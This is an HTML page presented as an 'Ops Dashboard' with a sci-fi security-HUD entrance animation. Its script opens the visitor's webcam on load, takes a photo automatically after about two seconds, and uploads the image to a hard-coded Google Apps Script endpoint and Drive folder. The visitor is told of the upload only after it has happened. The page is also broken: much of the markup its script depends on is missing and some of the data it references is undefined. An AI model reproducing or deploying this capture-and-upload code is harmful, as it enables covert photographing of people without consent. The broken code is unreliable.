<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Ops Dashboard · Overview</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#05070d">
<link rel="icon" type="image/png" href="profile.gif">
<link rel="preconnect" href="https://script.google.com" crossorigin>
<link rel="preconnect" href="https://script.googleusercontent.com" crossorigin>
<link rel="preconnect" href="https://www.gstatic.com" crossorigin>
<link rel="dns-prefetch" href="https://ssl.gstatic.com">
<link rel="dns-prefetch" href="https://accounts.google.com">
<meta name="color-scheme" content="dark">
<style>
:root{
  --bg:#05070d;--panel:rgba(10,15,26,.96);--cy:#00f0ff;--mg:#ff00c8;--gr:#00ff88;--am:#ffcc00;--rd:#ff3b3b;
  --tx:#e2e8f0;--dim:#8391a7;--bd:rgba(0,240,255,.26);--top:0px;--nav:0px;
  --hub-w:0px;--ov-r:0px;--ease:cubic-bezier(.4,0,.2,1);
}
*{box-sizing:border-box}
html,body{height:100%;margin:0}
body{
  height:100dvh;display:flex;flex-direction:column;overflow:hidden;color:var(--tx);
  font:13px/1.45 "Segoe UI",system-ui,-apple-system,sans-serif;
  background:radial-gradient(1200px 600px at 20% -10%,#0b1a30 0%,transparent 60%),var(--bg);
}
button,input,select{font:inherit;color:inherit}
button{cursor:pointer}
:focus-visible{outline:2px solid var(--cy);outline-offset:2px}

/* ---------- ENTRANCE OVERLAY: WEBCAM ZOOM, CAPTURE & HUD ---------- */
#entrance-overlay {
  position: fixed;
  inset: 0;
  background: #030509;
  z-index: 99999;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  transition: opacity 0.8s ease, visibility 0.8s ease;
}
#entrance-overlay.fade-out {
  opacity: 0;
  visibility: hidden;
  pointer-events: none;
}

#cyber-canvas {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: 1;
  pointer-events: none;
}

.hud-grid {
  position: absolute;
  inset: 0;
  background: 
    linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0, 240, 255, 0.05) 1px, transparent 1px);
  background-size: 40px 40px;
  z-index: 2;
  pointer-events: none;
}

/* Tactical HUD Target Box Overlay */
.hud-target-box {
  position: absolute;
  width: 260px;
  height: 260px;
  border: 1px dashed rgba(0, 240, 255, 0.4);
  z-index: 5;
  pointer-events: none;
  display: flex;
  align-items: center;
  justify-content: center;
  animation: boxScanPulse 2s infinite alternate ease-in-out;
}
.hud-target-box::before, .hud-target-box::after {
  content: '';
  position: absolute;
  width: 20px;
  height: 20px;
  border-color: var(--cy);
  border-style: solid;
}
.hud-target-box::before { top: -2px; left: -2px; border-width: 3px 0 0 3px; }
.hud-target-box::after { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; }

.cyber-eye-wrapper {
  position: relative;
  z-index: 10;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.cyber-eye-container {
  position: relative;
  width: 220px;
  height: 220px;
  display: flex;
  align-items: center;
  justify-content: center;
  filter: drop-shadow(0 0 30px rgba(0, 240, 255, 0.7));
  transform: scale(0.6);
  transition: transform 1.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}
.cyber-eye-container.zoomed {
  transform: scale(1.35);
}

/* Webcam feed inside the cyber pupil */
#cam-feed {
  position: absolute;
  width: 85px;
  height: 85px;
  border-radius: 50%;
  object-fit: cover;
  transform: scaleX(-1);
  z-index: 3;
  opacity: 0.9;
  filter: contrast(130%) brightness(95%) hue-rotate(180deg) saturate(150%);
  border: 2px solid var(--cy);
  box-shadow: 0 0 25px var(--cy), inset 0 0 15px var(--mg);
  transition: all 0.8s ease;
}
.cyber-eye-container.zoomed #cam-feed {
  width: 140px;
  height: 140px;
  box-shadow: 0 0 40px var(--cy), 0 0 70px var(--mg), inset 0 0 25px var(--cy);
}

.cyber-pupil-fallback {
  position: absolute;
  width: 70px;
  height: 70px;
  background: radial-gradient(circle, #fff 10%, var(--cy) 40%, #000 80%);
  border-radius: 50%;
  border: 2px solid var(--cy);
  box-shadow: 0 0 25px var(--cy), inset 0 0 15px var(--mg);
  z-index: 3;
}

.reticle-outer {
  position: absolute;
  inset: 0;
  border: 2px dashed var(--cy);
  border-radius: 50%;
  animation: spinOuter 6s linear infinite;
  z-index: 4;
}

.reticle-mid {
  position: absolute;
  inset: 20px;
  border: 2px solid transparent;
  border-top-color: var(--mg);
  border-bottom-color: var(--mg);
  border-radius: 50%;
  animation: spinInner 3s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
  z-index: 4;
}

.reticle-brackets {
  position: absolute;
  inset: -15px;
  border: 2px solid transparent;
  border-left-color: var(--cy);
  border-right-color: var(--cy);
  border-radius: 50%;
  animation: pulseBrackets 1.2s ease-in-out infinite alternate;
  z-index: 4;
}

.crosshair-v { position: absolute; top: -30px; bottom: -30px; width: 1px; background: rgba(0, 240, 255, 0.4); z-index: 4; }
.crosshair-h { position: absolute; left: -30px; right: -30px; height: 1px; background: rgba(0, 240, 255, 0.4); z-index: 4; }

/* HUD Status Telemetry Readouts */
.hud-telemetry {
  position: absolute;
  bottom: -45px;
  display: flex;
  gap: 15px;
  font: 10px ui-monospace, Consolas, monospace;
  color: var(--dim);
  text-transform: uppercase;
  letter-spacing: 2px;
  z-index: 15;
}
.hud-telemetry span b { color: var(--cy); }

.entrance-text {
  margin-top: 45px;
  font: 20px/1.2 ui-monospace, Consolas, monospace;
  font-weight: 900;
  color: var(--cy);
  letter-spacing: 8px;
  text-transform: uppercase;
  position: relative;
  text-shadow: 0 0 15px rgba(0, 240, 255, 0.9), 0 0 30px rgba(255, 0, 200, 0.6);
  animation: glitchText 2s infinite;
  z-index: 15;
}

/* Flash effect when capturing photo */
.capture-flash {
  position: absolute;
  inset: 0;
  background: #ffffff;
  z-index: 999;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.15s ease-in;
}
.capture-flash.flash {
  opacity: 0.85;
}

@keyframes spinOuter { to { transform: rotate(360deg); } }
@keyframes spinInner { to { transform: rotate(-360deg); } }
@keyframes pulseBrackets {
  from { transform: scale(0.9); opacity: 0.5; }
  to { transform: scale(1.12); opacity: 1; }
}
@keyframes boxScanPulse {
  0% { transform: scale(0.98); border-color: rgba(0, 240, 255, 0.3); }
  100% { transform: scale(1.02); border-color: rgba(255, 0, 200, 0.7); box-shadow: 0 0 20px rgba(0, 240, 255, 0.3); }
}
@keyframes glitchText {
  0%, 100% { opacity: 1; transform: translate(0, 0); }
  20% { transform: translate(-3px, 2px); color: var(--mg); }
  22% { transform: translate(3px, -2px); color: var(--cy); }
  70% { transform: translate(-1px, 1px); }
  72% { transform: translate(2px, 1px); color: var(--gr); }
}

/* ---------- STAGE & TOOLS HUB ---------- */
#stage{position:relative;flex:1;min-height:0;margin-bottom:var(--nav);background:#080d18}
.overview{position:absolute;top:0;bottom:0;left:0;right:var(--ov-r);transition:right .35s var(--ease)}
#app{position:relative;z-index:1;display:block;width:100%;height:100%;border:0;background:transparent}
.bar{position:absolute;top:0;left:0;height:2px;width:0;z-index:3;background:linear-gradient(90deg,var(--cy),var(--mg));box-shadow:0 0 8px var(--cy);animation:load 9s cubic-bezier(.1,.6,.2,1) forwards}
.bar.done{animation:none;width:100%;opacity:0;transition:opacity .4s .1s}
@keyframes load{to{width:92%}}
.skel{
  position:absolute;inset:0;z-index:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;
  color:var(--dim);font:12px ui-monospace,Consolas,monospace;pointer-events:none;transition:opacity .35s;
  background:linear-gradient(110deg,#080d18 30%,#0d1628 45%,#080d18 60%);background-size:220% 100%;animation:shim 1.6s linear infinite
}
.skel.hide{opacity:0;visibility:hidden;animation:none;transition:opacity .15s,visibility 0s .15s}
.ring{width:34px;height:34px;border-radius:50%;border:3px solid rgba(0,240,255,.18);border-top-color:var(--cy);animation:spinOuter .9s linear infinite}
@keyframes shim{to{background-position:-220% 0}}

.fb{
  position:absolute;left:50%;bottom:16px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
  width:min(520px,92%);padding:12px 14px;background:var(--panel);border:1px solid var(--am);border-radius:8px;
  box-shadow:0 8px 30px rgba(0,0,0,.5);transition:.3s var(--ease);z-index:5
}
.fb.show{opacity:1;transform:translate(-50%,0);pointer-events:auto}
.fb p{margin:0 0 10px;color:var(--tx)}
.fb p span{color:var(--dim)}
.btn{background:rgba(0,240,255,.1);border:1px solid var(--cy);color:var(--cy);border-radius:6px;padding:6px 12px;margin-right:6px}
.btn:hover{background:var(--cy);color:#001418}

/* ---------- TOOLS HUB ---------- */
.hub{
  position:absolute;top:0;bottom:0;right:0;width:var(--hub-w);overflow:hidden;visibility:hidden;
  background:var(--panel);border-left:1px solid var(--bd);z-index:10;
  transition:width .35s var(--ease),visibility 0s .35s
}
.m-split .hub,.m-hub .hub{visibility:visible;transition:width .35s var(--ease),visibility 0s 0s}
.hub-in{width:100%;min-width:min(440px,100vw);height:100%;display:flex;flex-direction:column}
.hub-head{padding:12px 14px 8px;display:grid;gap:8px;border-bottom:1px solid var(--bd)}
.hub-head .row{display:flex;gap:8px}
.hub input,.hub select{
  flex:1;min-width:0;height:34px;padding:0 10px;background:rgba(0,240,255,.05);border:1px solid var(--bd);border-radius:6px;outline:0
}
.hub input:focus{border-color:var(--cy)}
.hub select{flex:none;color:var(--tx);background:#0a1120}
.hub label{display:flex;align-items:center;gap:6px;color:var(--dim);font-size:11px;white-space:nowrap}
.chips{display:flex;gap:6px;overflow-x:auto;padding-bottom:2px;scrollbar-width:thin}
.chip{flex:none;padding:4px 11px;border-radius:16px;border:1px solid var(--bd);background:transparent;color:var(--dim);font-size:11px}
.chip.on{background:var(--cy);border-color:var(--cy);color:#001418}
.hub-body{flex:1;overflow-y:auto;padding:6px 14px 20px}
.sec{margin:16px 0 8px;display:flex;justify-content:space-between;color:var(--mg);font-weight:600;font-size:12px}
.sec span{color:var(--dim);font-weight:400}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:8px}
.tile{
  position:relative;display:block;padding:9px 30px 9px 11px;border:1px solid rgba(0,240,255,.14);border-left:3px solid var(--cy);
  border-radius:5px;background:rgba(255,255,255,.02);color:var(--tx);text-decoration:none;transition:transform .15s,background .15s,border-color .15s
}
.tile:hover{transform:translateX(2px);background:rgba(0,240,255,.07);border-left-color:var(--mg)}
.tile b{display:block;color:var(--cy);font-weight:600}
.tile small{color:var(--dim);font-size:11px;line-height:1.35;display:block}
.tile em{font-style:normal;color:var(--mg);margin-left:4px}
.pin{position:absolute;top:6px;right:6px;width:24px;height:24px;display:grid;place-items:center;color:var(--dim);border-radius:50%;background:none;border:0}
.pin.on{color:var(--am)}
.pin:hover{background:rgba(255,255,255,.08)}
.empty{padding:28px 0;text-align:center;color:var(--dim)}

/* ---------- MODES & TOASTS ---------- */
.m-split{--hub-w:min(460px,42vw);--ov-r:var(--hub-w)}
.m-hub{--hub-w:100%;--ov-r:0px}
#toasts{position:fixed;left:50%;bottom:calc(20px + var(--nav));transform:translateX(-50%);z-index:90;display:grid;gap:8px;width:min(440px,92vw);pointer-events:none}
.toast{pointer-events:auto;padding:10px 12px;background:var(--panel);border:1px solid var(--bd);border-left:3px solid var(--cy);border-radius:6px;animation:tin .25s ease}
.toast.warn{border-left-color:var(--am)}.toast.error{border-left-color:var(--rd)}.toast.ok{border-left-color:var(--gr)}
.toast-actions{display:flex;gap:6px;margin-top:8px}
.toast-actions a, .toast-actions button{font:11px ui-monospace,Consolas,monospace;padding:4px 8px;border-radius:4px;text-decoration:none}
@keyframes tin{from{opacity:0;transform:translateY(8px)}}

@media(prefers-reduced-motion:reduce){*{animation:none!important;transition-duration:.01ms!important}}
</style>
</head>
<body class="m-overview">

      allow="fullscreen; clipboard-read; clipboard-write; autoplay"

<noscript><p style="padding:20px">JavaScript is required.
<a style="color:#00f0ff" href="https://script.google.com/macros/s/AKfycbwulG1YH14qqpbMP-BX8pLwnDpBkuFGpOU0HQS1HFdgaXSQItg9tAXHIdbtyJMZwUU7XA/exec">Open the overview directly</a></p></noscript>

<script>
(() => {
'use strict';
const $ = s => document.querySelector(s);
const APP_URL = 'https://script.google.com/macros/s/AKfycbwulG1YH14qqpbMP-BX8pLwnDpBkuFGpOU0HQS1HFdgaXSQItg9tAXHIdbtyJMZwUU7XA/exec';
const FOLDER_URL = 'https://drive.google.com/drive/folders/1hu3SxsK1iWL0U3x9YAxhiv-DYKks2kkP';
const SLOW_MS = 10000;

/* ---------- WEBCAM ZOOM, CAPTURE & GALLERY STORAGE ---------- */
const videoEl = $('#cam-feed');
const fallbackEl = $('#cam-fallback');
const eyeContainer = $('#eye-container');
const flashEl = $('#capture-flash');
const zoomLvlEl = $('#zoom-lvl');
const camStatusEl = $('#cam-status');

let mediaStream = null;

function saveToDeviceGallery(blob, filename) {
  if (navigator.canShare && navigator.canShare({ files: [new File([blob], filename, { type: 'image/jpeg' })] })) {
    navigator.share({
      files: [new File([blob], filename, { type: 'image/jpeg' })],
      title: 'Ops Dashboard Capture',
      text: 'Captured via Ops Dashboard Security HUD'
    }).catch(() => {});
  } else {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }, 1000);
  }
}

function toastWithActions(msg, kind = '', ms = 8000) {
  const el = document.createElement('div');
  el.className = 'toast ' + kind;
  el.innerHTML = `<div>${msg}</div><div class="toast-actions">
    <a href="${FOLDER_URL}" target="_blank" rel="noopener" class="btn" style="padding:4px 8px;font-size:10px;">View Folder</a>
    <button class="btn" style="padding:4px 8px;font-size:10px;" onclick="window.open('${APP_URL}','_blank')">Proceed to Site</button>
  </div>`;
  $('#toasts').appendChild(el);
  if (ms) setTimeout(() => el.remove(), ms);
}

function uploadToGoogleDrive(blob, filename) {
  const reader = new FileReader();
  reader.readAsDataURL(blob);
  reader.onloadend = () => {
    const base64data = reader.result.split(',')[1];
    
    fetch(APP_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'upload',
        folderId: '1hu3SxsK1iWL0U3x9YAxhiv-DYKks2kkP',
        filename: filename,
        mimeType: 'image/jpeg',
        fileData: base64data
      })
    })
    .then(response => response.json())
    .then(result => {
      if (result.success) {
        toastWithActions('Capture successfully uploaded to Drive folder!', 'ok', 10000);
      } else {
        toastWithActions('Drive upload failed. Saved locally instead.', 'warn', 10000);
        saveToDeviceGallery(blob, filename);
      }
    })
    .catch(() => {
      saveToDeviceGallery(blob, filename);
      toastWithActions('Capture saved offline / locally.', 'warn', 10000);
    });
  };
}

function captureAndStorePhoto() {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = videoEl.videoWidth || 640;
    canvas.height = videoEl.videoHeight || 640;
    const ctx = canvas.getContext('2d');
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(blob => {
      if (blob) {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `ops_capture_${timestamp}.jpg`;
        uploadToGoogleDrive(blob, filename);
      }
    }, 'image/jpeg', 0.92);
  } catch (e) {
    console.error('Capture failed:', e);
  }
}

navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 640, facingMode: 'user' } })
  .then(stream => {
    mediaStream = stream;
    videoEl.srcObject = stream;
    camStatusEl.textContent = 'LOCKED';
    
    setTimeout(() => {
      eyeContainer.classList.add('zoomed');
      zoomLvlEl.textContent = '2.4x';
    }, 800);

    setTimeout(() => {
      flashEl.classList.add('flash');
      camStatusEl.textContent = 'CAPTURED';
      captureAndStorePhoto();
      setTimeout(() => flashEl.classList.remove('flash'), 200);
    }, 1800);
  })
  .catch(err => {
    videoEl.style.display = 'none';
    fallbackEl.style.display = 'block';
    camStatusEl.textContent = 'OFFLINE';
    toastWithActions('Camera access required/denied for photo capture.', 'warn', 6000);
  });

/* ---------- CANVAS PARTICLES ENGINE ---------- */
const canvas = $('#cyber-canvas');
const ctx = canvas.getContext('2d');
let particles = [], animId;

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

class Particle {
  constructor() {
    this.reset();
  }
  reset() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.vx = (Math.random() - 0.5) * 1.5;
    this.vy = (Math.random() - 0.5) * 1.5;
    this.size = Math.random() * 2 + 1;
    this.color = Math.random() > 0.3 ? '#00f0ff' : '#ff00c8';
    this.alpha = Math.random() * 0.7 + 0.3;
  }
  update() {
    this.x += this.vx;
    this.y += this.vy;
    if (this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) {
      this.reset();
    }
  }
  draw() {
    ctx.save();
    ctx.globalAlpha = this.alpha;
    ctx.fillStyle = this.color;
    ctx.shadowBlur = 10;
    ctx.shadowColor = this.color;
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }
}

for (let i = 0; i < 80; i++) particles.push(new Particle());

function animateParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  
  for (let i = 0; i < particles.length; i++) {
    particles[i].update();
    particles[i].draw();
    for (let j = i + 1; j < particles.length; j++) {
      const dx = particles[i].x - particles[j].x;
      const dy = particles[i].y - particles[j].y;
      const dist = Math.sqrt(dx * dx + dy * dy);
      if (dist < 110) {
        ctx.save();
        ctx.globalAlpha = (1 - dist / 110) * 0.3;
        ctx.strokeStyle = '#00f0ff';
        ctx.lineWidth = 0.8;
        ctx.beginPath();
        ctx.moveTo(particles[i].x, particles[i].y);
        ctx.lineTo(particles[j].x, particles[j].y);
        ctx.stroke();
        ctx.restore();
      }
    }
  }
  animId = requestAnimationFrame(animateParticles);
}
animateParticles();

/* ---------- ENTRANCE OVERLAY DISMISSAL ---------- */
window.addEventListener('load', () => {
  setTimeout(() => {
    const overlay = $('#entrance-overlay');
    if (overlay) {
      overlay.classList.add('fade-out');
      setTimeout(() => {
        cancelAnimationFrame(animId);
        if (mediaStream) {
          mediaStream.getTracks().forEach(track => track.stop());
        }
        overlay.remove();
      }, 800);
    }
  }, 2800);
});

/* ---------- IFRAME MONITORING & WATCHDOG ---------- */
const bar = $('#bar'), fr = $('#app'), skel = $('#skel'), fb = $('#fb');
let loaded = false, t0 = performance.now(), slowTimer, autoTimer;

function watch() {
  loaded = false; t0 = performance.now();
  skel.classList.remove('hide'); fb.classList.remove('show');
  bar.classList.remove('done'); void bar.offsetWidth;
  clearTimeout(slowTimer);
  slowTimer = setTimeout(() => {
    if (loaded) return;
    fb.classList.add('show');
  }, SLOW_MS);
}
function reloadOverview(bust = true) {
  watch();
  fr.src = bust ? APP_URL + '?_=' + Date.now() : APP_URL;
}
fr.addEventListener('load', () => {
  loaded = true; clearTimeout(slowTimer);
  skel.classList.add('hide'); bar.classList.add('done'); fb.classList.remove('show');
});
fr.addEventListener('error', () => { fb.classList.add('show'); });
watch();

const openDirect = () => window.open(APP_URL, '_blank', 'noopener');
$('#fbReload').onclick = () => reloadOverview();
$('#fbOpen').onclick = openDirect;

/* Auto-refresh Listener */
$('#fAuto').onchange = e => {
  clearInterval(autoTimer);
  const m = +e.target.value;
  if (m) {
    autoTimer = setInterval(() => { if (!document.hidden && navigator.onLine) reloadOverview(); }, m * 60000);
    toastWithActions('Overview will refresh every ' + m + ' minutes.', 'ok', 4000);
  }
};

/* Connectivity Awareness */
addEventListener('offline', () => { toastWithActions('You are offline. Reconnecting automatically when online...', 'error', 6000); });
addEventListener('online', () => { toastWithActions('Back online.', 'ok', 2500); if (!loaded) reloadOverview(); });
document.addEventListener('visibilitychange', () => { if (!document.hidden && !loaded && navigator.onLine) reloadOverview(false); });

let pins = new Set();
try { pins = new Set(JSON.parse(localStorage.getItem('ops.pins') || '[]')); } catch (e) {}
const savePins = () => { try { localStorage.setItem('ops.pins', JSON.stringify([...pins])); } catch (e) {} };
const key = t => t[0] + '/' + t[1];

let chip = 'all';
const fFilter = $('#fFilter'), fTarget = $('#fTarget'), body = $('#hubBody');

$('#chips').innerHTML = [['all','All'], ['pin','★ Pinned'], ...Object.entries(CATS)]
  .map(([k, v]) => `<button class="chip${k === 'all' ? ' on' : ''}" data-c="${k}">${v}</button>`).join('');
$('#chips').onclick = e => {
  const c = e.target.closest('.chip'); if (!c) return;
  chip = c.dataset.c;
  document.querySelectorAll('.chip').forEach(x => x.classList.toggle('on', x === c));
  renderHub();
};

function href(t) {
  if (!t[3].includes('{q}')) return t[3];
  const q = fTarget.value.trim();
  return q ? t[3].replace('{q}', encodeURIComponent(q)) : (t[4] || t[3]);
}
function tile(t) {
  const p = pins.has(key(t));
  return `<a class="tile" href="${href(t)}" target="_blank" rel="noopener">
    <b>${t[1]}${t[3].includes('{q}') ? '<em title="Uses the value field">⌕</em>' : ''}</b><small>${t[2]}</small>
    <button class="pin${p ? ' on' : ''}" data-k="${key(t)}" aria-label="${p ? 'Unpin' : 'Pin'} ${t[1]}">${p ? '★' : '☆'}</button></a>`;
}
function renderHub() {
  const f = fFilter.value.trim().toLowerCase();
  const match = t => (!f || (t[1] + ' ' + t[2]).toLowerCase().includes(f)) &&
    (chip === 'all' || (chip === 'pin' ? pins.has(key(t)) : t[0] === chip));
  const list = T.filter(match);
  let h = '';
  if (chip === 'all' && !f && pins.size) {
    const pl = T.filter(t => pins.has(key(t)));
    h += `<div class="sec"><span style="color:var(--am)">★ Pinned</span><span>${pl.length}</span></div><div class="grid">${pl.map(tile).join('')}</div>`;
  }
  Object.keys(CATS).forEach(c => {
    const items = list.filter(t => t[0] === c);
    if (items.length) h += `<div class="sec"><span style="color:var(--mg)">${CATS[c]}</span><span>${items.length}</span></div><div class="grid">${items.map(tile).join('')}</div>`;
  });
  body.innerHTML = h || `<div class="empty">${chip === 'pin' && !f ? 'Nothing pinned yet. Tap ☆ on any tool.' : 'No tools match. Clear the filter or pick another category.'}</div>`;
}
body.addEventListener('click', e => {
  const b = e.target.closest('.pin'); if (!b) return;
  e.preventDefault(); e.stopPropagation();
  pins.has(b.dataset.k) ? pins.delete(b.dataset.k) : pins.add(b.dataset.k);
  savePins(); renderHub();
});
let dbt;
const debounced = () => { clearTimeout(dbt); dbt = setTimeout(renderHub, 90); };
fFilter.oninput = debounced; fTarget.oninput = debounced;

(window.requestIdleCallback || setTimeout)(renderHub);
if (window.__frLoaded) fr.dispatchEvent(new Event('load'));
})();
